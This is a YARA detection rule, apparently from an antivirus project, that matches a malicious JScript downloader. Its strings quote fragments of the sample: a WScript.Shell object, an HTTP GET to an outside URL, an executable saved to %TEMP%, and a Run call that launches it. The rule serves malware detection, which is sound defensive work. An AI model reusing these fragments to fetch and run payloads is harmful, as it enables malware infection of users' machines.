rule sig_20160328_dc3031ac1d87595ef655c13aea2150e8 {
  meta:
    description = "datamaliciousorder - file 20160328_dc3031ac1d87595ef655c13aea2150e8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "596ab101cb737bc9c39193fe59208f2a8ba1ff533e99eefb5d5c8573fff0a6e2"

  strings:
    $s1  = "function Ucqntkw() {return Dccwnask[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"pZwE0Tlz.exe\";};" fullword ascii
    $s2  = "Mlakecaj[Wotide](\"GET\", \"http://purelaces.com/ny6sja\", false);" fullword ascii
    $s3  = "function Ycizv(Emcqxxmo, Pamiz){return Emcqxxmo - Pamiz;};" fullword ascii
    $s4  = "var Dccwnask = function Rucxq() {return WScript[Ciivif](\"WScript.Shell\");}();" fullword ascii
    $s5  = "do {WScript[Nbqjwmkml](Ymoqedzgke() * 11)} while (Mlakecaj[\"readystate\"] < 4 );" fullword ascii
    $s6  = "function Ptzgrm() {return ((Alcqiz == true) && (Alcqiz == Hpqlbn)) ? 1 : Hthtbawpm;};" fullword ascii
    $s7  = "function Vqtujahtg(Amrfxuyaq){Dccwnask[\"Run\"](Amrfxuyaq, Hthtbawpm, Hthtbawpm);};" fullword ascii
    $s8  = "function Lqrpudqvew(){return Ciivif;};" fullword ascii
    $s9  = "var Hpqlbn = false;" fullword ascii
    $s10 = "function Arxfnwow()" fullword ascii
    $s11 = "Alcqiz = true; " fullword ascii
    $s12 = " while (Xuxoev){" fullword ascii
    $s13 = "var Alcqiz = false;" fullword ascii
    $s14 = "function Pjtigtuxuy(){return Jdcxjwokl;};" fullword ascii
    $s15 = "return Ycizv(Cdkokb, Bqoapbsgcj);" fullword ascii
    $s16 = "var Kslyh = false;" fullword ascii
    $s17 = "var Uywurstuh = new this[\"Date\"]();" fullword ascii
    $s18 = "Hpqlbn = true; " fullword ascii
    $s19 = "function Ymoqedzgke(){return 22;};" fullword ascii
    $s20 = "function Sxzhpgyt(Pmuwsuth) {var Mfpxhomes = (1, 2, 3, 4, 5, Pmuwsuth); return Mfpxhomes;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}